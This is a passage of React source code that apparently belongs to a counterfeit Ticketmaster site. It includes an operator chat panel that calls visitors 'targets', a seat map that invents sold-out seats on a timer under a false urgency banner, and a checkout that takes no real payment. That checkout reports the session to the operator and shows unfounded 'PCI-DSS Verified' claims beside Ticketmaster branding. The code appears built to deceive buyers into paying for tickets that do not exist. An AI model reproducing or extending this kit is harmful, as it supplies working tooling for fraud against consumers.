                     <button onClick={() => { const i = document.getElementById('admin-reply'); if(i.value.trim()){ sendChatMessage(activeTarget.id, i.value, 'system'); i.value=''; } }} className="absolute right-4 top-4 bg-[#026cdf] text-white p-4 rounded-[30px] shadow-2xl hover:bg-blue-700 transition-all active:scale-90"><Send className="w-8 h-8" /></button>
                  </div>
               </div>
            </div>
          </>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center opacity-10 animate-pulse italic">
             <Activity className="w-48 h-48 mb-8" />
             <h3 className="text-4xl font-black uppercase tracking-[1em]">SIGNAL STABLE - NO TARGETS</h3>
          </div>
        )}
      </div>
    </div>
  );
}

// ==========================================
// VIEWS: SEAT MAP & CHECKOUT (MERGED)
// ==========================================

function SeatMapView({ event, presaleCode, cart, setCart, globalPrice, onCheckout }) {
  const [isLocked, setIsLocked] = useState(event?.status === 'presale');
  const [view, setView] = useState('overview');
  const [code, setCode] = useState('');
  const [fakeSold, setFakeSold] = useState([]);
  const [toast, setToast] = useState(null);

  useEffect(() => {
    if (isLocked) return;
    const itv = setInterval(() => {
       const sid = `s-${Math.ceil(Math.random()*8)}-${Math.ceil(Math.random()*12)}`;
       setFakeSold(prev => [...new Set([...prev, sid])]);
    }, 4500);
    return () => clearInterval(itv);
  }, [isLocked]);

  const handleSeat = (s) => {
    if (fakeSold.includes(s.id)) return;
    if (cart.find(item => item.id === s.id)) setCart(cart.filter(item => item.id !== s.id));
    else { if(cart.length < 8) setCart([...cart, s]); }
  };

  if (isLocked) return (
    <div className="min-h-[85vh] flex items-center justify-center p-6">
      <div className="bg-white w-full max-w-md rounded-[70px] shadow-2xl p-14 space-y-12 animate-slideUp text-center border-4 border-white">
        <div className="w-24 h-24 bg-blue-50 rounded-[40px] flex items-center justify-center mx-auto mb-6 shadow-inner"><Lock className="text-[#026cdf] w-12 h-12" /></div>
        <h2 className="text-5xl font-black tracking-tighter uppercase italic">Access Denied</h2>
        <p className="text-[11px] font-black uppercase tracking-[0.4em] text-gray-400">Identity Verification Required</p>
        <input className="w-full border-4 border-gray-50 p-7 rounded-[35px] font-black text-center text-4xl uppercase tracking-[0.6em] outline-none focus:border-[#026cdf] transition-all bg-gray-50" placeholder="CODE" value={code} onChange={e=>setCode(e.target.value.toUpperCase())} />
        <button onClick={() => { if(code===presaleCode){ setIsLocked(false); } else { alert("Invalid Fan Code"); } }} className="w-full bg-[#026cdf] text-white py-7 rounded-[35px] font-black shadow-2xl italic text-lg uppercase tracking-widest">Verify & Access</button>
      </div>
    </div>
  );

  return (
    <div className="h-[calc(100vh-64px)] flex flex-col bg-[#f1f5f9] relative italic">
      <div className="bg-[#ea0042] text-white text-[10px] py-2 text-center font-black tracking-[0.4em] uppercase animate-pulse shadow-xl">Urgent: Floor seats are selling out in real-time. Act fast.</div>
      <div className="flex-1 overflow-y-auto p-4 md:p-12 pb-40">
        <div className="max-w-7xl mx-auto space-y-12">
          {view === 'overview' ? (
            <div className="bg-white p-14 rounded-[80px] shadow-2xl border-8 border-white text-center animate-slideUp relative">
              <div className="space-y-4 mb-14">
                <h2 className="text-5xl md:text-7xl font-black tracking-tighter uppercase italic">{event?.artist}</h2>
                <p className="text-gray-400 font-black uppercase tracking-[0.4em] text-sm">{event?.venue} • {event?.date}</p>
              </div>
              <div onClick={() => setView('zoom')} className="w-full max-w-2xl mx-auto aspect-video bg-blue-50 border-4 border-dashed border-[#026cdf] rounded-[70px] flex flex-col items-center justify-center cursor-pointer hover:scale-[1.02] transition-all relative group">
                <div className="absolute top-0 w-64 h-10 bg-black rounded-b-[30px] font-black text-[10px] text-white flex items-center justify-center tracking-[0.6em] border-b-8 border-black/40">STAGE</div>
                <div className="bg-white px-12 py-8 rounded-[45px] shadow-2xl border-2 border-blue-50 flex flex-col items-center group-hover:scale-110 transition-all">
                  <span className="font-black text-[#026cdf] text-4xl tracking-tighter italic">FLOOR</span>
                  <span className="text-[11px] font-black text-gray-400 mt-2 uppercase tracking-[0.4em]">Tap to Zoom</span>
                </div>
              </div>
            </div>
          ) : (
            <div className="animate-fadeIn">
              <button onClick={() => setView('overview')} className="mb-10 text-[#026cdf] font-black text-[11px] flex items-center gap-3 bg-white px-8 py-4 rounded-full shadow-2xl uppercase tracking-[0.4em] border-2 border-gray-50 active:scale-90 transition-all"><ChevronLeft /> Stadium Overview</button>
              <div className="bg-white p-12 rounded-[80px] shadow-2xl border-8 border-white space-y-6 overflow-x-auto min-w-full relative">
                <div className="bg-black text-white text-center py-10 font-black tracking-[3em] text-sm mb-20 rounded-[45px] shadow-2xl border-b-[12px] border-gray-900 uppercase italic">STAGE</div>
                {[...Array(8)].map((_, r) => (
                  <div key={r} className="flex gap-4 justify-center">
                    {[...Array(12)].map((_, c) => {
                      const id = `s-${r+1}-${c+1}`;
                      const isSold = fakeSold.includes(id) || (r + c) % 7 === 0;
                      const isSel = cart.find(item => item.id === id);
                      const isVIP = r < 2;
                      return (
                        <div key={id} onClick={() => handleSeat({id, section: 'Floor', row: r+1, seat: c+1, price: isVIP ? globalPrice * 3 : globalPrice})} className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center text-[10px] font-black transition-all border-2 cursor-pointer ${isSel ? 'bg-green-500 border-green-700 text-white scale-125 shadow-[0_0_20px_#22c55e]' : isSold ? 'bg-gray-100 border-gray-100 opacity-20 text-transparent cursor-not-allowed' : isVIP ? 'bg-amber-400 border-amber-600 text-amber-950 shadow-lg' : 'bg-[#026cdf] border-blue-800 text-white shadow-xl hover:scale-110 active:scale-95'}`}>{isSel ? <CheckCircle className="w-6 h-6" /> : c+1}</div>
                      );
                    })}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>
      <div className="h-32 bg-white/95 backdrop-blur-xl border-t-2 border-gray-50 p-8 fixed bottom-0 w-full shadow-[0_-30px_100px_rgba(0,0,0,0.2)] flex items-center justify-between z-[100]">
        <div className="space-y-1"><p className="text-[12px] text-gray-400 font-black uppercase tracking-[0.4em] leading-none">{cart.length} Seats Locked</p><p className="text-5xl font-black text-gray-900 tracking-tighter leading-none italic">${cart.reduce((a, b) => a + b.price, 0).toFixed(2)}</p></div>
        <button onClick={onCheckout} disabled={cart.length===0} className={`px-24 py-7 rounded-[40px] font-black text-white shadow-2xl transition-all uppercase tracking-[0.2em] text-2xl italic ${cart.length > 0 ? 'bg-[#026cdf] hover:bg-blue-700 hover:scale-105 active:scale-95 shadow-blue-500/50' : 'bg-gray-200 cursor-not-allowed opacity-50'}`}>Checkout</button>
      </div>
    </div>
  );
}

function CheckoutView({ cart, sessionId, sessionData, updateSession, onSuccess, onBack }) {
  const [loading, setLoading] = useState(false);
  const total = (cart.reduce((a, b) => a + b.price, 0) + (cart.length * 19.50) + 5.00).toFixed(2);

  const handlePay = () => {
    setLoading(true);
    updateSession(sessionId, { status: 'confirming_payment' });
    setTimeout(() => { setLoading(false); onSuccess(); }, 3000);
  };

  return (
    <div className="min-h-screen bg-[#f8fafc] p-6 italic pb-40">
      <div className="max-w-4xl mx-auto space-y-10">
        <button onClick={onBack} className="text-[#026cdf] font-black text-[11px] uppercase tracking-[0.4em] flex items-center gap-3 active:scale-90 transition-all"><ChevronLeft /> Edit Seats</button>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
           <div className="bg-white p-10 rounded-[60px] shadow-2xl space-y-8 border-4 border-white">
              <h3 className="text-3xl font-black tracking-tighter uppercase italic border-b border-gray-100 pb-6">Payment Order</h3>
              {cart.map(s => (
                <div key={s.id} className="flex justify-between items-center text-sm font-bold border-b border-gray-50 pb-4 last:border-0"><div className="space-y-1"><p className="text-gray-400 text-[10px] uppercase tracking-widest">Section {s.section}</p><p className="text-gray-900">Row {s.row}, Seat {s.seat}</p></div><p className="font-black text-[#026cdf]">${s.price.toFixed(2)}</p></div>
              ))}
              <div className="bg-gray-50 p-8 rounded-[40px] space-y-3 shadow-inner"><div className="flex justify-between items-center text-[10px] font-black text-gray-400 uppercase tracking-widest"><span>Service Fees</span><span>${(cart.length * 19.5).toFixed(2)}</span></div><div className="flex justify-between items-center text-3xl font-black text-gray-900 tracking-tighter uppercase mt-4 italic"><span>Total</span><span>${total}</span></div></div>
           </div>
           <div className="bg-white p-10 rounded-[60px] shadow-2xl space-y-10 border-4 border-white h-fit">
              <div className="space-y-3"><h3 className="text-3xl font-black tracking-tighter uppercase italic leading-none">Security Flow</h3><p className="text-[10px] font-black uppercase text-gray-400 tracking-[0.3em]">Authorized Payment Terminal</p></div>
              <div className="space-y-5">
                 <div className="bg-[#026cdf]/5 p-6 rounded-[30px] border-2 border-dashed border-[#026cdf]/30 text-center"><p className="text-[10px] text-[#026cdf] font-black uppercase italic tracking-widest">A verification token has been assigned to your session. Complete the payment below to release your mobile tickets.</p></div>
                 <div className="space-y-4">
                    <div className="bg-gray-50 p-5 rounded-[25px] border-2 border-gray-100"><p className="text-[9px] font-black uppercase text-gray-300 mb-2">Delivery Email</p><p className="font-black text-gray-900 italic">{sessionData.email || 'Verified Account'}</p></div>
                    <button onClick={handlePay} className="w-full bg-[#026cdf] text-white py-6 rounded-[35px] font-black shadow-2xl uppercase tracking-widest text-xl italic hover:scale-105 transition-all shadow-blue-500/40">{loading ? 'Processing...' : 'Complete Payment'}</button>
                    <p className="text-[9px] text-gray-400 text-center uppercase tracking-widest font-black opacity-40 italic">Global Encryption Secure • PCI-DSS Verified</p>
                 </div>
              </div>
           </div>
        </div>
      </div>
    </div>
  );
}

function SuccessScreen({ event, cart, onHome }) {
  const [showPrize, setShowPrize] = useState(false);
  useEffect(() => { setTimeout(() => setShowPrize(true), 800); }, []);
  const total = (cart.reduce((a,b)=>a+b.price,0) + (cart.length * 19.50) + 5.00).toFixed(2);
  return (
    <div className="min-h-screen bg-[#026cdf] flex items-center justify-center p-6 overflow-hidden relative">
      <div className="absolute inset-0 pointer-events-none opacity-40">
         {[...Array(50)].map((_, i) => (<div key={i} className={`absolute w-3 h-14 bg-white rounded-full animate-confetti`} style={{ left: `${Math.random()*100}%`, animationDelay: `${Math.random()*3}s`, top: `-100px` }} />))}
      </div>
      <div className={`bg-white w-full max-w-lg rounded-[90px] p-16 text-center shadow-[0_120px_250px_rgba(0,0,0,0.6)] transition-all duration-1000 transform ${showPrize ? 'scale-100 opacity-100' : 'scale-50 opacity-0 translate-y-40'}`}>
         <div className="w-32 h-32 bg-green-500 rounded-[45px] flex items-center justify-center mx-auto mb-10 shadow-[0_30px_100px_rgba(34,197,94,0.5)] animate-bounce"><CheckCircle className="text-white w-16 h-16 stroke-[4]" /></div>
         <h1 className="text-5xl font-black text-gray-900 leading-tight mb-4 uppercase italic tracking-tighter italic">YOU GOT THE TICKETS!</h1>
         <div className="bg-gray-50 rounded-[60px] p-12 border-8 border-dashed border-gray-100 mb-12 space-y-6 shadow-inner text-center">
            <Ticket className="w-16 h-16 text-[#026cdf] mx-auto mb-4 animate-pulse" />
            <div className="flex flex-col items-center justify-center gap-4">
               <div className="flex items-center justify-center gap-2"><span className="font-bold text-3xl tracking-tighter uppercase italic">ticketmaster</span><div className="bg-[#026cdf] rounded-full w-5 h-5 flex items-center justify-center shadow-lg"><CheckCircle className="w-3.5 h-3.5 text-white" /></div></div>
               <p className="text-8xl font-black text-gray-900 tracking-tighter italic drop-shadow-sm">${total}</p>
            </div>
         </div>
         <button onClick={onHome} className="w-full bg-[#1f262d] text-white py-8 rounded-[40px] font-black text-2xl hover:bg-black uppercase tracking-widest italic shadow-[0_30px_80px_rgba(0,0,0,0.4)] active:scale-95 transition-all">OPEN TICKETS</button>
      </div>
    </div>
  );
}

